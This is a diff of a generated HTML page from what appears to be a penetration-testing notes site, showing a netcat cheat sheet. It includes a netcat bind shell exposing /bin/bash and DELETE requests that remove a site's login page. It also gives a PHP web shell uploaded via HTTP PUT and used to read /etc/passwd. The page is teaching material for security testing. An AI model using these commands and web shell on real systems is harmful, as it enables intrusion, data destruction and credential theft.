@@ -685,6 +685,8 @@
       
         
       
+        
+      
     
     
     
@@ -767,6 +769,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17352,126 +17375,173 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>Preinstalled in kali. Netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP.</p>
 <p>For windows: <a href="https://nmap.org/ncat/">https://nmap.org/ncat/</a>.</p>
 <p>For linux: </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>ncat
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>ncat
+</span></code></pre></div></td></tr></table></div>
 <h2 id="usage">Usage</h2>
 <p>It’s used for HTTP</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nc<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&lt;port&gt;<span class="w"> </span>-flags
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>nc<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&lt;port&gt;<span class="w"> </span>-flags
+</span></code></pre></div></td></tr></table></div>
 <h3 id="fingerprinting-with-netcat">Fingerprinting with netcat</h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nc<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="m">80</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>HEAD<span class="w"> </span>/<span class="w"> </span>HTTP/1.0<span class="w">     </span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># And hit RETURN twice</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>nc<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="m">80</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>HEAD<span class="w"> </span>/<span class="w"> </span>HTTP/1.0<span class="w">     </span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="c1"># And hit RETURN twice</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Also, Nmap does not always recognize all information by default. Sometimes you can use netcat to interpelate a service:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="go"> nc -nv $ip &lt;PORT NUMBER&gt;</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="go"> nc -nv $ip &lt;PORT NUMBER&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="netcat-commands">Netcat commands</h2>
 <h3 id="as-a-server">As a server</h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">8888</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="c1">#-p: specify a port</span>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="c1">#-l: to listening</span>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1">#-v: verbosity</span>
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="c1">#-u: enforces udp connection</span>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="c1">#-e: executes the given command</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span>
+<span class="normal"><a href="#__codelineno-4-4">4</a></span>
+<span class="normal"><a href="#__codelineno-4-5">5</a></span>
+<span class="normal"><a href="#__codelineno-4-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">8888</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="c1">#-p: specify a port</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="c1">#-l: to listening</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="c1">#-v: verbosity</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="c1">#-u: enforces udp connection</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="c1">#-e: executes the given command</span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="as-a-client">As a client</h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nc<span class="w"> </span>-v<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&lt;port&gt;
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>nc<span class="w"> </span>-v<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&lt;port&gt;
+</span></code></pre></div></td></tr></table></div>
 <h2 id="transfer-data">Transfer data</h2>
 <p>On the server side:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1">#data will be printed on screen</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>nc<span class="w"> </span>-lvp<span class="w"> </span>&lt;port&gt;<span class="w">  </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="c1">#data will be printed on screen</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>nc<span class="w"> </span>-lvp<span class="w"> </span>&lt;port&gt;<span class="w">  </span>
+</span></code></pre></div></td></tr></table></div>
 <p>On the client side:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">echo</span><span class="w"> </span>“hello”<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-v<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&lt;port&gt;
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="nb">echo</span><span class="w"> </span>“hello”<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-v<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&lt;port&gt;
+</span></code></pre></div></td></tr></table></div>
 <h2 id="transfer-data-and-save-it-in-a-file">Transfer data and save it in a file</h2>
 <p>On the server side: </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Data will be stored in reveived.txt file.</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>nc<span class="w"> </span>-lvp<span class="w"> </span>&lt;port&gt;<span class="w"> </span>&gt;<span class="w"> </span>received.txt<span class="w">   </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="c1"># Data will be stored in reveived.txt file.</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>nc<span class="w"> </span>-lvp<span class="w"> </span>&lt;port&gt;<span class="w"> </span>&gt;<span class="w"> </span>received.txt<span class="w">   </span>
+</span></code></pre></div></td></tr></table></div>
 <p>On the client side:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">echo</span><span class="w"> </span>“hello”<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-v<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&lt;port&gt;
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="nb">echo</span><span class="w"> </span>“hello”<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-v<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&lt;port&gt;
+</span></code></pre></div></td></tr></table></div>
 <h2 id="transfer-file-and-save-it">Transfer file and save it</h2>
 <p>On the server side: </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># Received data will be stored in reveived.txt file.</span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>nc<span class="w"> </span>-lvp<span class="w"> </span>&lt;port&gt;<span class="w"> </span>&gt;<span class="w"> </span>received.txt<span class="w">   </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="c1"># Received data will be stored in reveived.txt file.</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a>nc<span class="w"> </span>-lvp<span class="w"> </span>&lt;port&gt;<span class="w"> </span>&gt;<span class="w"> </span>received.txt<span class="w">   </span>
+</span></code></pre></div></td></tr></table></div>
 <p>On the client side:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>cat<span class="w"> </span>tobesentfiel.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-v<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&lt;port&gt;
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>cat<span class="w"> </span>tobesentfiel.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-v<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&lt;port&gt;
+</span></code></pre></div></td></tr></table></div>
 <h2 id="netcat-shell">Netcat shell</h2>
 <p>On the server side:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>nc<span class="w"> </span>-lvp<span class="w"> </span>&lt;port&gt;<span class="w"> </span>-e<span class="w"> </span>/bin/bash
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>nc<span class="w"> </span>-lvp<span class="w"> </span>&lt;port&gt;<span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</span></code></pre></div></td></tr></table></div>
 <p>On the client side:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>nc<span class="w"> </span>-v<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&lt;port&gt;
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>nc<span class="w"> </span>-v<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&lt;port&gt;
+</span></code></pre></div></td></tr></table></div>
 <h2 id="some-enumeration-techniques-for-http-verbs">Some enumeration techniques for HTTP verbs</h2>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># Send a OPTIONS message with netcat</span>
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>nc<span class="w"> </span>victim.target<span class="w"> </span><span class="m">80</span>
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>OPTIONS<span class="w"> </span>/<span class="w"> </span>HTTP/1.0
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span>
+<span class="normal"><a href="#__codelineno-14-2">2</a></span>
+<span class="normal"><a href="#__codelineno-14-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="c1"># Send a OPTIONS message with netcat</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a>nc<span class="w"> </span>victim.target<span class="w"> </span><span class="m">80</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3"></a>OPTIONS<span class="w"> </span>/<span class="w"> </span>HTTP/1.0
+</span></code></pre></div></td></tr></table></div>
 <h2 id="some-exploitation-techniques-for-http-verbs">Some exploitation techniques for HTTP verbs</h2>
 <h3 id="delete-attack">DELETE attack</h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># General syntax for removing a resource from server using netcat</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>nc<span class="w"> </span>victim.site<span class="w"> </span><span class="m">80</span>
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>DELETE<span class="w"> </span>/path/to/resource.txt<span class="w"> </span>HTTP/1.0
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="c1"># Example for removing the login page of a site</span>
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>nc<span class="w"> </span>victim.site<span class="w"> </span><span class="m">80</span>
-</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>DELETE<span class="w"> </span>/login.php<span class="w"> </span>HTTP/1.0
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span>
+<span class="normal"><a href="#__codelineno-15-3">3</a></span>
+<span class="normal"><a href="#__codelineno-15-4">4</a></span>
+<span class="normal"><a href="#__codelineno-15-5">5</a></span>
+<span class="normal"><a href="#__codelineno-15-6">6</a></span>
+<span class="normal"><a href="#__codelineno-15-7">7</a></span>
+<span class="normal"><a href="#__codelineno-15-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="c1"># General syntax for removing a resource from server using netcat</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>nc<span class="w"> </span>victim.site<span class="w"> </span><span class="m">80</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a>DELETE<span class="w"> </span>/path/to/resource.txt<span class="w"> </span>HTTP/1.0
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4"></a>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5"></a>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6"></a><span class="c1"># Example for removing the login page of a site</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7"></a>nc<span class="w"> </span>victim.site<span class="w"> </span><span class="m">80</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8"></a>DELETE<span class="w"> </span>/login.php<span class="w"> </span>HTTP/1.0
+</span></code></pre></div></td></tr></table></div>
 <h3 id="put-attack-getting-a-shell">PUT attack: getting a shell</h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># Save for instance a php basic shell in a file (shell.php):</span>
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>&lt;?php<span class="w"> </span>
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="k">if</span><span class="w"> </span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span>‘cmd’<span class="o">]))</span>
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="o">{</span>
-</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="w">    </span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_GET</span><span class="o">[</span>‘cmd’<span class="o">]</span><span class="p">;</span>
-</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span>‘&lt;pre&gt;’<span class="p">;</span>
-</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="w">    </span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>shell_exec<span class="o">(</span><span class="nv">$cmd</span><span class="o">)</span><span class="p">;</span>
-</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$result</span><span class="p">;</span>
-</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span>‘&lt;/pre&gt;’<span class="p">;</span>
-</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>?&gt;
-</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>
-</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>
-</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="c1"># Count the size of the file</span>
-</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>wc<span class="w"> </span>-m<span class="w"> </span>shell.php
-</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a>
-</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a><span class="c1"># Send with netcat the HTTP verb message</span>
-</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a>nc<span class="w"> </span>victim.site<span class="w"> </span><span class="m">80</span>
-</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a>PUT<span class="w"> </span>/shell.php<span class="w"> </span>HTTP/1.0
-</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a>Conten-type:<span class="w"> </span>text/html
-</span><span id="__span-16-21"><a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a>Content-length:<span class="w"> </span><span class="o">[</span>number<span class="w"> </span>you<span class="w"> </span>got<span class="w"> </span>with<span class="w"> </span>wc<span class="w"> </span>-m<span class="w"> </span>payload<span class="o">]</span>
-</span><span id="__span-16-22"><a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a>
-</span><span id="__span-16-23"><a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a>
-</span><span id="__span-16-24"><a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a><span class="c1"># Run the exploit by typing in the browser:</span>
-</span><span id="__span-16-25"><a id="__codelineno-16-25" name="__codelineno-16-25" href="#__codelineno-16-25"></a>http://victim.site/shell.php?cmd<span class="o">=</span>cat+/etc/passwd
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-16-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-16-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-16-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-16-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-16-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-16-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-16-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-16-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-16-10">10</a></span>
+<span class="normal"><a href="#__codelineno-16-11">11</a></span>
+<span class="normal"><a href="#__codelineno-16-12">12</a></span>
+<span class="normal"><a href="#__codelineno-16-13">13</a></span>
+<span class="normal"><a href="#__codelineno-16-14">14</a></span>
+<span class="normal"><a href="#__codelineno-16-15">15</a></span>
+<span class="normal"><a href="#__codelineno-16-16">16</a></span>
+<span class="normal"><a href="#__codelineno-16-17">17</a></span>
+<span class="normal"><a href="#__codelineno-16-18">18</a></span>
+<span class="normal"><a href="#__codelineno-16-19">19</a></span>
+<span class="normal"><a href="#__codelineno-16-20">20</a></span>
+<span class="normal"><a href="#__codelineno-16-21">21</a></span>
+<span class="normal"><a href="#__codelineno-16-22">22</a></span>
+<span class="normal"><a href="#__codelineno-16-23">23</a></span>
+<span class="normal"><a href="#__codelineno-16-24">24</a></span>
+<span class="normal"><a href="#__codelineno-16-25">25</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="c1"># Save for instance a php basic shell in a file (shell.php):</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3"></a>&lt;?php<span class="w"> </span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4"></a><span class="k">if</span><span class="w"> </span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span>‘cmd’<span class="o">]))</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5"></a><span class="o">{</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6"></a><span class="w">    </span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_GET</span><span class="o">[</span>‘cmd’<span class="o">]</span><span class="p">;</span>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span>‘&lt;pre&gt;’<span class="p">;</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8"></a><span class="w">    </span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>shell_exec<span class="o">(</span><span class="nv">$cmd</span><span class="o">)</span><span class="p">;</span>
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$result</span><span class="p">;</span>
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span>‘&lt;/pre&gt;’<span class="p">;</span>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11"></a>?&gt;
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12"></a>
+</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13"></a>
+</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14"></a><span class="c1"># Count the size of the file</span>
+</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15"></a>wc<span class="w"> </span>-m<span class="w"> </span>shell.php
+</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16"></a>
+</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17"></a><span class="c1"># Send with netcat the HTTP verb message</span>
+</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18"></a>nc<span class="w"> </span>victim.site<span class="w"> </span><span class="m">80</span>
+</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19"></a>PUT<span class="w"> </span>/shell.php<span class="w"> </span>HTTP/1.0
+</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20"></a>Conten-type:<span class="w"> </span>text/html
